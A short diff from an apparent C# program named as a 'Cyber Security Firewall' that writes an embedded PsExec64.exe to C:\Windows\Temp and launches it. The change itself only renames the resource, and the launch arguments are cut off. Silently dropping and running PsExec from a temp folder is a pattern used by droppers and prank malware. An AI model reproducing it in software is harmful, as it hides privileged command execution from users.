@@ -34,7 +34,7 @@ namespace Trump_s_Cyber_Security_Firewall_TM
             try
             {
                 File.WriteAllBytes("C:\\Windows\\Temp\\PsExec64.exe",
-                    Properties.Resources.PsExec64
+                    Properties.Resources.PsExec
                     );
 
                 Process.Start("C:\\Windows\\Temp\\PsExec64.exe",
